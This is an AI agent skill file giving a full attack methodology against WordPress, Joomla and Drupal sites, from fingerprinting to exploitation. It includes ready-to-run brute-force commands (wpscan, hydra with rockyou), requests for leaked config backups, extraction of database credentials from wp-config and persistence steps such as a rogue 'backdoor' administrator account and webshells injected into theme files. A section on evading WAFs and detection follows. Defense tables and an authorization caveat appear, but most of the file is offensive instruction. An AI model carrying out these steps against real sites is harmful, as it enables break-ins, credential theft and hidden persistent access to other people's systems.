---
name: cms-framework-attack
description: "Targeted security assessment of Content Management Systems (WordPress, Joomla, Drupal) using specialized scanners and exploit techniques."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 7
  guide_count: 3
---




# Skill: CMS Framework Attack / Content Management System Exploitation

> **Supplementary Files**:
> - `payloads.md` — CMS attack payload collection: CMS fingerprinting, WordPress enumeration, Joomla/Drupal scanning, plugin/theme vulnerability exploitation, admin brute force, webshell upload, config disclosure
> - `test-cases.md` — Structured testing checklist covering CMS identification, WordPress/WPScan, Joomla/JoomScan, Drupal/Droopescan, nuclei CMS templates, and admin compromise

## Summary

Cms Framework Attack skill domain covering web attack operations.

**Tools**: wpscan, joomscan, droopescan, cmseek, nikto, whatweb, nuclei

**Domain**: web-attack

## Description

Targeted security assessment of Content Management Systems (WordPress, Joomla, Drupal) using specialized scanners and exploit techniques. Covers the full attack chain from CMS fingerprinting and version identification through plugin/theme enumeration, vulnerability mapping, credential attacks, and post-exploitation including webshell deployment and privilege escalation.

This skill domain addresses the reality that CMS platforms power over 40% of the web and represent a high-value attack surface. Misconfigured plugins, outdated themes, default credentials, and exposed administrative interfaces provide reliable entry points during penetration tests.

**Agent capability statement**: Complete CMS attack methodology mastered across WordPress, Joomla, and Drupal. Capable of automated enumeration, targeted exploitation, and post-compromise escalation on all major CMS platforms.

## Use Cases

1. **WordPress penetration testing** — Enumerate users, plugins, and themes with WPScan; identify vulnerable extensions; exploit XML-RPC, wp-config disclosure, and known plugin CVEs
2. **Joomla security assessment** — Use JoomScan for component enumeration; exploit known Joomla CVEs; brute-force administrator credentials; leverage configuration file exposure
3. **Drupal vulnerability assessment** — Scan with Droopescan for version and module enumeration; target Drupalgeddon exploits; exploit configuration export vulnerabilities
4. **CMS fingerprinting and identification** — Use CMSeeK and WhatWeb to identify CMS type, version, installed plugins, and technologies before targeted exploitation
5. **Nuclei-based CMS scanning** — Leverage nuclei CMS template library for automated vulnerability discovery across WordPress, Joomla, Drupal, and other platforms
6. **Post-exploitation persistence** — Upload webshells through admin panels, modify theme/plugin files, create rogue administrator accounts, establish persistent access

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **wpscan** | WordPress vulnerability scanner: user enum, plugin/theme detection, brute force | `wpscan --url http://target --enumerate u,vp,vt,dbe` |
| **joomscan** | Joomla vulnerability scanner: component detection, config disclosure | `joomscan -u http://target` |
| **droopescan** | Drupal/CMS scanner: version detection, module enumeration, CVE checks | `droopescan scan drupal -u http://target` |
| **cmseek** | CMS identification and deep fingerprinting: 180+ CMS detection | `cmseek -u http://target` |
| **nikto** | Web server scanner: misconfigurations, dangerous files, outdated components | `nikto -h http://target` |
| **whatweb** | Web technology fingerprinting: CMS, framework, server identification | `whatweb -v http://target` |
| **nuclei** | Template-based vulnerability scanner with extensive CMS templates | `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress` |

## Methodology

### Attack Chain

```
CMS Fingerprint → Version/Component Enum → Vulnerability Mapping → Exploitation → Escalation
(cmseek/whatweb)  (wpscan/joomscan/       (CVE database,           (plugin vuln,     (admin access,
                  droopescan)              plugin advisories)       config disclosure, webshell upload,
                                                                     brute force)       RCE)
```

**Phase Details**:

1. **Identify (Fingerprinting)**
   - Use CMSeeK for deep CMS identification covering 180+ platforms
   - Run WhatWeb for technology stack fingerprinting (server, framework, CMS version)
   - Identify CMS type, version, installed extensions, and underlying technologies
   - Check HTTP headers, meta tags, robots.txt, sitemap.xml, and known CMS file paths
   - Map the attack surface before targeted scanning

2. **Enumerate (Reconnaissance)**
   - WordPress: enumerate users (author archives, REST API, feeds), plugins, themes, configuration backups
   - Joomla: enumerate components, modules, templates, configuration files
   - Drupal: enumerate modules, themes, configuration exports, node types
   - Identify all installed extensions with exact version numbers for CVE mapping

3. **Vulnerability (Mapping)**
   - Map identified CMS core version to known CVEs using vulnerability databases
   - Cross-reference plugin/theme versions against exploit-db and vendor advisories
   - Test for configuration disclosure (wp-config.php.bak, configuration.php~, settings.php.old)
   - Check for exposed database dumps, backup archives, and debug endpoints
   - Identify authentication bypass vectors and default credential possibilities

4. **Exploit (Attack)**
   - Exploit known plugin vulnerabilities (RCE, SQLi, XSS, file upload) with version-specific payloads
   - Abuse XML-RPC for WordPress (pingback DDoS, enumeration, brute force amplification)
   - Target configuration file disclosure for database credential extraction
   - Perform targeted brute force against discovered usernames using custom wordlists
   - Exploit known CMS core vulnerabilities (Drupalgeddon, Joomla RCE chains)

5. **Escalate (Post-Exploitation)**
   - Gain administrator panel access through credential compromise or session hijacking
   - Upload webshells disguised as plugins or theme modifications
   - Modify CMS files to inject backdoors and establish persistence
   - Extract database credentials from configuration files for further lateral movement
   - Pivot to underlying server through CMS-level RCE vulnerabilities

### Defense Perspective

| Defense Measure | Description | Priority |
|----------------|-------------|----------|
| Keep CMS and all extensions updated | Apply security patches within 24 hours of release | CRITICAL |
| Remove version fingerprinting | Strip generator meta tags, CHANGELOG files, readme.html | HIGH |
| Restrict admin panel access | IP-whitelist /wp-admin, /administrator, /admin | CRITICAL |
| Implement WAF rules | Block known CMS attack patterns and bot scanners | HIGH |
| Disable file editing in admin | Set DISALLOW_FILE_EDIT and DISALLOW_FILE_MODS in WordPress | HIGH |
| Enforce strong password policy | Require 16+ character passwords, enable 2FA for admins | CRITICAL |
| Remove unused plugins/themes | Each installed extension increases attack surface | HIGH |
| Block enumeration endpoints | Disable REST API user enumeration, author archives | MEDIUM |

## Practical Steps

### Step 1: CMS Identification and Fingerprinting

Identify the CMS platform, version, and technology stack before investing time in targeted scanning.

```bash
# Deep CMS identification
cmseek -u http://target --follow-redirect

# Technology fingerprinting
whatweb -v http://target

# Quick Nikto scan for misconfigurations
nikto -h http://target -C all
```

### Step 2: Targeted CMS Enumeration

Run the platform-specific scanner for deep enumeration of users, plugins, themes, and potential vulnerabilities.

```bash
# WordPress full enumeration
wpscan --url http://target --enumerate u,vp,vt,dbe,cb --api-token YOUR_TOKEN

# Joomla comprehensive scan
joomscan -u http://target --scan-all

# Drupal module and version detection
droopescan scan drupal -u http://target -t 16
```

### Step 3: Vulnerability Mapping and Exploitation

Map discovered components to known CVEs and attempt exploitation of vulnerable plugins and configurations.

```bash
# nuclei CMS-specific vulnerability scan
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress,joomla,drupal

# WPScan vulnerability assessment (requires API token for vulnerability data)
wpscan --url http://target --enumerate vp,vt --api-token YOUR_TOKEN

# Test for configuration file disclosure
curl http://target/wp-config.php.bak
curl http://target/configuration.php~
curl http://target/sites/default/settings.php.bak
```

### Step 4: Credential Attacks and Admin Access

Perform targeted brute force and password spraying against enumerated usernames.

```bash
# WordPress user enumeration and brute force
wpscan --url http://target --passwords /usr/share/wordlists/rockyou.txt --usernames admin,user1,editor

# WordPress XML-RPC brute force (harder to detect)
wpscan --url http://target --passwords passwords.txt --max-threads 10 --password-attack xmlrpc

# Joomla admin brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login&option=com_login:F=Invalid"
```

### Step 5: Post-Exploitation and Persistence

After gaining admin access, establish persistence and extract additional credentials.

```bash
# Upload webshell via WordPress plugin editor (after admin access)
# Navigate to Appearance > Theme Editor, inject PHP code into theme files

# Create rogue admin user via WordPress CLI (if server access available)
wp user create backdoor backdoor@evil.com --role=administrator --user_pass=Str0ngP@ss!

# Extract database credentials from wp-config.php
cat /var/www/html/wp-config.php | grep DB_

# Access Drupal configuration export (if available)
curl http://target/admin/config/development/configuration/export
```

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist.**

## Common Pitfalls

- **Relying on a single scanner**: WPScan may miss vulnerabilities that nuclei detects and vice versa. Always combine multiple tools and cross-reference results. CMSeeK identifies CMS types that specialized scanners might misclassify.
- **Ignoring plugin version granularity**: A plugin identified as "Contact Form 7" without a version number provides no actionable vulnerability intelligence. Use aggressive enumeration flags (`--enumerate vp`) and API-backed vulnerability databases to get exact version-to-CVE mapping.
- **Overlooking backup and configuration files**: Backup files (`.bak`, `.old`, `.save`, `~`) of configuration files often reside in the web root because administrators copy rather than move them. Always test for wp-config.php.bak, configuration.php~, and settings.php.old before attempting complex exploits.
- **Neglecting XML-RPC in WordPress**: Many testers focus on wp-login.php brute force and forget XML-RPC at /xmlrpc.php. This endpoint amplifies brute force by allowing hundreds of credentials per request and enables pingback attacks for SSRF and DDoS.
- **Skipping enumeration for direct exploitation**: Jumping straight to exploit attempts without thorough enumeration wastes time and increases detection risk. Invest 80% of effort in reconnaissance and enumeration.

## Automation and Scripting

Automate the full CMS assessment pipeline by chaining identification tools into targeted scanners. Start with whatweb for quick fingerprinting, then dispatch the appropriate platform-specific scanner based on the detected CMS. Use nuclei for automated CVE scanning across the full template library, with results parsed into a structured report. Script WordPress password auditing with WPScan's API token integration to automate plugin vulnerability lookups. For large-scale assessments, wrap CMSeeK and nuclei in a bash pipeline that fingerprints multiple targets concurrently and generates per-host vulnerability reports.

## Reporting and Documentation

CMS assessment reports must include the CMS version, all enumerated extensions with their version numbers, and the specific CVEs or misconfigurations discovered. For each vulnerability, document the exact exploit path (plugin name, version, attack vector) and the data or access obtained. Include remediation specific to the finding: update plugin X to version Y, remove file Z from web root, restrict admin panel to specific IP ranges. Map all findings to OWASP categories and provide a risk rating based on the CVSS score and the actual impact demonstrated during testing.

## Legal and Ethical Considerations

CMS scanning is noisy and easily detected by WAF and SIEM systems. Always verify scope authorization before scanning, and use rate-limiting flags to avoid denial-of-service conditions. Brute force attacks against admin panels may lock legitimate user accounts — coordinate timing with the client. Do not upload webshells or modify CMS files on production systems without explicit written authorization. If admin credentials are obtained during testing, document the finding without making unauthorized changes to the CMS configuration or content.

## Integration with Other Tools

CMS assessment findings chain directly into multiple attack paths. Extracted database credentials from wp-config.php enable database-level exploitation (web-sqli skill). Identified webshells or file upload vulnerabilities connect to post-exploitation methodology. Server-side vulnerabilities discovered through CMS plugins (deserialization, SSTI) lead into code execution chains. Discovered API endpoints in REST API extensions feed into api-security assessment. Use CMS compromise as a pivot point for lateral movement to the underlying server and internal network.

## Case Studies and Examples

- **WordPress plugin RCE via outdated Contact Form**: WPScan identified Contact Form 7 version 5.3.0, vulnerable to unauthenticated file upload (CVE-2020-36124). Uploading a PHP webshell through the vulnerable AJAX endpoint provided remote code execution and full server compromise.
- **Drupalgeddon2 remote code execution**: Droopescan identified Drupal 8.5.0. The Drupalgeddon2 vulnerability (CVE-2018-7600) allowed unauthenticated RCE through the Drupal render API. A single curl command exploiting the `#lazy_builder` callback achieved command execution as the web server user.
- **Joomla configuration disclosure to database access**: JoomScan detected an exposed configuration.php~ file containing database credentials in plaintext. The MySQL server was accessible from the testing machine, enabling direct database connection, administrative hash extraction, and full site takeover.

## Detection Methods

CMS attacks are detected through: WAF signatures matching known scanner user agents (WPScan, JoomScan), rate-limiting alerts on login endpoints, file integrity monitoring on CMS core files and configuration, audit logs recording plugin installation and theme modification, and SIEM correlation rules detecting enumeration patterns (sequential user ID requests, plugin directory brute forcing). Defenders should implement rate limiting on all authentication endpoints, deploy ModSecurity with OWASP CRS for CMS-specific rules, and monitor for backup file access attempts.

## Defense Evasion Techniques

Evade CMS attack detection by: rotating user agent strings with each scanner request (`--random-user-agent`), throttling scan speed to stay below WAF rate limits (`--throttle 500`), distributing brute force attempts across XML-RPC and wp-login.php endpoints, using proxy chains to rotate source IPs during enumeration, and leveraging legitimate API endpoints (WordPress REST API) instead of direct file path probing. For nuclei scanning, use `-rl 50` to limit request rate and `-c 25` to control concurrency.

## Advanced Techniques

Advanced CMS exploitation includes: exploiting WordPress deserialization vulnerabilities in meta-box handling, chaining Drupal Drupalgeddon vulnerabilities for container escape, abusing Joomla JDatabase driver injection for blind SQL extraction, exploiting WordPress object cache poisoning for authentication bypass, leveraging CMS cron endpoints for blind command execution, and targeting multisite WordPress installations for cross-site privilege escalation. For WordPress specifically, exploit the WP-Cron system for load-based side channel attacks and abuse the plugin/theme installation mechanism with crafted ZIP archives containing symlink attacks.

## Tool Comparison Matrix

| Tool | Best For | Automation | CMS Coverage |
|------|----------|------------|--------------|
| **wpscan** | WordPress deep enumeration | Fully automated | WordPress only |
| **joomscan** | Joomla vulnerability scanning | Fully automated | Joomla only |
| **droopescan** | Drupal/CMS version detection | Fully automated | Drupal, Joomla, WordPress, Moodle |
| **cmseek** | CMS identification (180+ platforms) | Fully automated | 180+ CMS platforms |
| **whatweb** | Quick technology fingerprinting | Semi-automated | All web technologies |
| **nikto** | Server misconfiguration scanning | Fully automated | All web servers |
| **nuclei** | Template-based CVE scanning | Fully automated | All CMS platforms (via templates) |

## Hacker Laws

| Law | CMS Attack Manifestation |
|-----|--------------------------|
| **Minimize Attack Surface** | Every installed plugin and theme expands the attack surface. Defense requires removing unused extensions, disabling XML-RPC, and restricting admin panel access to authorized IPs |
| **Trust but Verify** | Do not trust CMS version strings — they can be spoofed. Verify through multiple detection methods (file hashes, behavior, API responses) and always test for hidden or renamed admin panels |
| **Defense in Depth** | CMS security requires layered controls: WAF at the network edge, authentication hardening at the application layer, file integrity monitoring at the OS layer, and database access restrictions at the data layer |
| **Assume Breach** | Design CMS deployments assuming attackers will discover plugin vulnerabilities. Use read-only filesystem mounts for CMS core files, separate database credentials per installation, and implement audit logging for all administrative actions |
| **First Principles** | Understand how each CMS handles authentication, file uploads, and plugin execution. Without understanding WordPress's hook system or Drupal's render pipeline, you cannot identify novel vulnerabilities beyond known CVEs |

## Learning Resources

**Skill supplementary files**: payloads.md, test-cases.md

**Related Skills**:
- `skills/web-sqli/SKILL.md` — SQL injection: CMS databases often accessible through plugin vulnerabilities
- `skills/web-xss/SKILL.md` — XSS: CMS comment forms and content editors are common XSS vectors
- `skills/web-auth-bypass/SKILL.md` — Authentication bypass: CMS admin panel access techniques
- `skills/post-exploitation/SKILL.md` — Post-exploitation: webshell persistence and lateral movement from CMS compromise
- `skills/web-access-control/SKILL.md` — Access control: CMS privilege escalation and role manipulation

**Guides**:
- `guides/wordpress-pentest-guide.md` — Comprehensive WordPress penetration testing with WPScan
- `guides/joomla-drupal-cms-attack-guide.md` — Joomla and Drupal exploitation methodology
- `guides/cms-identification-enumeration-guide.md` — CMS fingerprinting and enumeration techniques

**External Resources**:
- [WPScan Documentation](https://github.com/wpscanner/wpscan)
- [JoomScan GitHub](https://github.com/OWASP/joomscan)
- [Droopescan GitHub](https://github.com/droope/droopescan)
- [CMSeeK GitHub](https://github.com/Tuhinshubhra/CMSeeK)
- [ProjectDiscovery Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [Exploit-DB CMS Exploits](https://www.exploit-db.com/)
- [WordPress Vulnerability Database](https://wpscan.com/vulnerabilities)
